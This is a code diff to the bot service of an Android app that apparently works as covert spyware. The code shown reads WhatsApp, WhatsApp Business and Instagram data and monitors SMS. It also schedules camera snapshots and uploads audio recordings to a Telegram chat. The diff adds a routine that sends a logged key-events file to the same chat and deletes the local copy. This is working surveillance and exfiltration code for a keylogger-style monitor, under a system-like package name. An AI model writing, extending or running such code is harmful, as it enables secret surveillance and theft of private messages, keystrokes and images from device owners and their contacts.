@@ -88,7 +88,7 @@ class BotService : Service() {
 
         val action = intent?.action
         if (action != null) {
-            LogManager.log(LogCategory.SYSTEM, "BotService received intent action: $action")
+            LogManager.log(LogCategory.SYSTEM, "Bot Service received intent action: $action")
         }
 
         // ── Dynamic feature toggle actions (no need to restart whole service) ──
@@ -118,6 +118,10 @@ class BotService : Service() {
         }
         if (action == "ACTION_UPLOAD_SNAPSHOT") {
             if (intent != null) handleUploadSnapshot(intent)
+            return START_STICKY
+        }
+        if (action == "ACTION_UPLOAD_KEY_EVENTS") {
+            handleUploadKeyEvents()
             return START_STICKY
         }
         if (action == "ACTION_POPUP_ACKNOWLEDGED") {
@@ -155,7 +159,7 @@ class BotService : Service() {
         startSmsMonitorIfEnabled()
         
         // Restore AlarmManager schedules (they are wiped by Android on reboot)
-        LogManager.log(LogCategory.SYSTEM, "Restoring active camera schedules from persistent preferences...")
+        LogManager.log(LogCategory.SNAPSHOTS, "Restoring active camera schedules from persistent preferences...")
         val scheduler = SnapshotScheduler(this)
         if (prefsManager?.enableSnapshots == true) scheduler.scheduleNextSnapshot()
         if (prefsManager?.enableFrontCamera == true) scheduler.scheduleNextCamera(1)
@@ -287,7 +291,7 @@ class BotService : Service() {
             val fileUri = android.net.Uri.parse(fileUriString)
             
             // Log what we received
-            LogManager.log(LogCategory.SYSTEM, "Received recording for upload: ${originalPath.joinToString("/")}")
+            LogManager.log(LogCategory.BASIC_UPDATE, "Received recording for upload: ${originalPath.joinToString("/")}")
             
             var originalFileName = originalPath.lastOrNull() ?: "recording.opus"
             val extension = android.webkit.MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)
@@ -310,99 +314,130 @@ class BotService : Service() {
                 )
                 
                 if (result != null) {
-                    LogManager.log(LogCategory.SYSTEM, "Successfully uploaded recording: ${originalPath.lastOrNull()}")
+                    LogManager.log(LogCategory.BASIC_UPDATE, "Successfully uploaded recording: ${originalPath.lastOrNull()}")
                     com.system.superiormonitor.bot.OfflineManager.moveRecordingToPermanent(this@BotService, fileUriString, originalPath, mimeType)
                 } else {
-                    LogManager.log(LogCategory.SYSTEM, "Failed to upload recording (API returned null). Left in offline.", LogLevel.ERROR)
+                    LogManager.log(LogCategory.BASIC_UPDATE, "Failed to upload recording (API returned null). Left in offline.", LogLevel.ERROR)
                 }
             } else {
-                LogManager.log(LogCategory.SYSTEM, "Telegram unreachable. Left in offline for later sync.")
+                LogManager.log(LogCategory.BASIC_UPDATE, "Telegram unreachable. Left in offline for later sync.")
             }
         }
     }
 
+    private fun handleUploadKeyEvents() {
+        serviceScope.launch(Dispatchers.IO) {
+            val token = prefsManager?.botToken ?: return@launch
+            val chatId = prefsManager?.chatId ?: return@launch
+            
+            if (!com.system.superiormonitor.bot.TelegramApi.isApiReachable(this@BotService, token)) {
+                return@launch // Network unavailable, retain file in offline queue
+            }
+            
+            val file = java.io.File(getExternalFilesDir(null), "keyevents/offline/offline_keyevents.txt")
+            if (file.exists() && file.length() > 0) {
+                val caption = com.system.superiormonitor.bot.BotMessages.FetchOps.buildRoutineKeyEventsCaption()
+                val success = com.system.superiormonitor.bot.TelegramApi.sendDocument(
+                    token, chatId, this@BotService, android.net.Uri.fromFile(file), "text/plain", file.name, caption
+                ) == true
+                
+                if (success) {
+                    file.delete()
+                    LogManager.log(LogCategory.BASIC_UPDATE, "Key Events uploaded successfully via timer.")
+                } else {
+                    LogManager.log(LogCategory.BASIC_UPDATE, "Failed to upload Key Events via timer. Retained locally.", LogLevel.ERROR)
+                }
+            }
+        }
+    }
 
     private fun startWhatsAppMonitorIfEnabled() {
         if (prefsManager?.whatsappUpdatesEnabled == true) {
-            if (whatsAppMonitor == null) {
-                // Fail-safe: Verify WhatsApp is installed and database is accessible
-                if (!WhatsAppMonitor.isWhatsAppInstalled(this)) {
-                    LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: WhatsApp is not installed. Disabling toggle.")
-                    prefsManager?.whatsappUpdatesEnabled = false
-                    return
-                }
-                val (dbAvailable, dbReason) = WhatsAppMonitor.checkWhatsAppDatabase()
-                if (!dbAvailable) {
-                    LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: $dbReason. Disabling toggle.")
-                    prefsManager?.whatsappUpdatesEnabled = false
-                    return
-                }
+            serviceScope.launch(Dispatchers.IO) {
+                if (whatsAppMonitor == null) {
+                    // Fail-safe: Verify WhatsApp is installed and database is accessible
+                    if (!WhatsAppMonitor.isWhatsAppInstalled(this@BotService)) {
+                        LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: WhatsApp is not installed. Disabling toggle.")
+                        prefsManager?.whatsappUpdatesEnabled = false
+                        return@launch
+                    }
+                    val (dbAvailable, dbReason) = WhatsAppMonitor.checkWhatsAppDatabase()
+                    if (!dbAvailable) {
+                        LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: $dbReason. Disabling toggle.")
+                        prefsManager?.whatsappUpdatesEnabled = false
+                        return@launch
+                    }
 
-                whatsAppMonitor = WhatsAppMonitor(this) { text, parseMode: String? ->
-                    val chatId = prefsManager?.chatId ?: return@WhatsAppMonitor false
-                    val token = prefsManager?.botToken ?: return@WhatsAppMonitor false
-                    val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
-                    msgId != null
+                    whatsAppMonitor = WhatsAppMonitor(this@BotService) { text, parseMode: String? ->
+                        val chatId = prefsManager?.chatId ?: return@WhatsAppMonitor false
+                        val token = prefsManager?.botToken ?: return@WhatsAppMonitor false
+                        val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                        msgId != null
+                    }
+                    LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor initialized.")
                 }
-                LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor initialized.")
+                whatsAppMonitor?.start(serviceScope)
             }
-            whatsAppMonitor?.start(serviceScope)
         }
     }
 
     private fun startWABusinessMonitorIfEnabled() {
         if (prefsManager?.whatsappBusinessUpdatesEnabled == true) {
-            if (waBusinessMonitor == null) {
-                // Fail-safe: Verify WhatsApp Business is installed and database is accessible
-                if (!com.system.superiormonitor.monitor.WABusinessMonitor.isWhatsAppInstalled(this)) {
-                    LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: WhatsApp Business is not installed. Disabling toggle.")
-                    prefsManager?.whatsappBusinessUpdatesEnabled = false
-                    return
-                }
-                val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WABusinessMonitor.checkWhatsAppDatabase()
-                if (!dbAvailable) {
-                    LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: $dbReason. Disabling toggle.")
-                    prefsManager?.whatsappBusinessUpdatesEnabled = false
-                    return
-                }
+            serviceScope.launch(Dispatchers.IO) {
+                if (waBusinessMonitor == null) {
+                    // Fail-safe: Verify WhatsApp Business is installed and database is accessible
+                    if (!com.system.superiormonitor.monitor.WABusinessMonitor.isWhatsAppInstalled(this@BotService)) {
+                        LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: WhatsApp Business is not installed. Disabling toggle.")
+                        prefsManager?.whatsappBusinessUpdatesEnabled = false
+                        return@launch
+                    }
+                    val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WABusinessMonitor.checkWhatsAppDatabase()
+                    if (!dbAvailable) {
+                        LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: $dbReason. Disabling toggle.")
+                        prefsManager?.whatsappBusinessUpdatesEnabled = false
+                        return@launch
+                    }
 
-                waBusinessMonitor = com.system.superiormonitor.monitor.WABusinessMonitor(this) { text, parseMode: String? ->
-                    val chatId = prefsManager?.chatId ?: return@WABusinessMonitor false
-                    val token = prefsManager?.botToken ?: return@WABusinessMonitor false
-                    val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
-                    msgId != null
+                    waBusinessMonitor = com.system.superiormonitor.monitor.WABusinessMonitor(this@BotService) { text, parseMode: String? ->
+                        val chatId = prefsManager?.chatId ?: return@WABusinessMonitor false
+                        val token = prefsManager?.botToken ?: return@WABusinessMonitor false
+                        val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                        msgId != null
+                    }
+                    LogManager.log(LogCategory.SYSTEM, "WA Business Monitor initialized.")
                 }
-                LogManager.log(LogCategory.SYSTEM, "WA Business Monitor initialized.")
+                waBusinessMonitor?.start(serviceScope)
             }
-            waBusinessMonitor?.start(serviceScope)
         }
     }
 
     private fun startInstagramMonitorIfEnabled() {
         if (prefsManager?.instagramEnabled == true) {
-            if (instagramMonitor == null) {
-                // Fail-safe: Verify Instagram is installed and database is accessible
-                if (!InstagramMonitor.isInstagramInstalled(this)) {
-                    LogManager.log(LogCategory.SYSTEM, "Instagram Monitor: Instagram is not installed. Disabling toggle.")
-                    prefsManager?.instagramEnabled = false
-                    return
-                }
-                val (dbAvailable, dbReason) = InstagramMonitor.checkInstagramDatabase()
-                if (!dbAvailable) {
-                    LogManager.log(LogCategory.SYSTEM, "Instagram Monitor: $dbReason Disabling toggle.")
-                    prefsManager?.instagramEnabled = false
-                    return
-                }
+            serviceScope.launch(Dispatchers.IO) {
+                if (instagramMonitor == null) {
+                    // Fail-safe: Verify Instagram is installed and database is accessible
+                    if (!InstagramMonitor.isInstagramInstalled(this@BotService)) {
+                        LogManager.log(LogCategory.SYSTEM, "Instagram Monitor: Instagram is not installed. Disabling toggle.")
+                        prefsManager?.instagramEnabled = false
+                        return@launch
+                    }
+                    val (dbAvailable, dbReason) = InstagramMonitor.checkInstagramDatabase()
+                    if (!dbAvailable) {
+                        LogManager.log(LogCategory.SYSTEM, "Instagram Monitor: $dbReason Disabling toggle.")
+                        prefsManager?.instagramEnabled = false
+                        return@launch
+                    }
 
-                instagramMonitor = InstagramMonitor(this) { text, parseMode: String? ->
-                    val chatId = prefsManager?.chatId ?: return@InstagramMonitor false
-                    val token = prefsManager?.botToken ?: return@InstagramMonitor false
-                    val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
-                    msgId != null
+                    instagramMonitor = InstagramMonitor(this@BotService) { text, parseMode: String? ->
+                        val chatId = prefsManager?.chatId ?: return@InstagramMonitor false
+                        val token = prefsManager?.botToken ?: return@InstagramMonitor false
+                        val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                        msgId != null
+                    }
+                    LogManager.log(LogCategory.SYSTEM, "Instagram Monitor initialized.")
                 }
-                LogManager.log(LogCategory.SYSTEM, "Instagram Monitor initialized.")
+                instagramMonitor?.start(serviceScope)
             }
-            instagramMonitor?.start(serviceScope)
         }
     }
 
@@ -449,29 +484,29 @@ class BotService : Service() {
                 startInstagramMonitorIfEnabled()
 
                 if (pollingJob?.isActive != true) {
-                    LogManager.log(LogCategory.SYSTEM, "Network connection detected. Initiating recovery sequence...")
+                    LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Network connection detected. Initiating recovery sequence...")
                     pollingJob?.cancel()
                     pollingJob = serviceScope.launch(Dispatchers.IO) {
                         val token = prefsManager?.botToken
                         if (token != null) {
-                            LogManager.log(LogCategory.SYSTEM, "Checking Telegram API reachability...")
+                            LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Checking Telegram API reachability...")
                             var attempts = 0
                             while (TelegramApi.getMe(token) == null) {
                                 attempts++
                                 if (attempts > 30) { // 60 seconds max wait
-                                    LogManager.log(LogCategory.SYSTEM, "[System] Telegram API unreachable. Returning to deep sleep.")
+                                    LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram API unreachable. Returning to deep sleep.")
                                     return@launch
                                 }
                                 delay(2000)
                             }
-                            LogManager.log(LogCategory.SYSTEM, "Telegram API is reachable!")
+                            LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram API is reachable!")
                         }
 
-                        LogManager.log(LogCategory.SYSTEM, "Waiting 5 seconds for network stabilization...")
+                        LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Waiting 5 seconds for network stabilization...")
                         delay(5000)
 
                         if (!resolveDnsWithRetries("api.telegram.org")) {
-                            LogManager.log(LogCategory.SYSTEM, "[System] DNS resolution failed after 3 retries. Returning to deep sleep.", LogLevel.ERROR)
+                            LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] DNS resolution failed after 3 retries. Returning to deep sleep.", LogLevel.ERROR)
                             return@launch
                         }
 
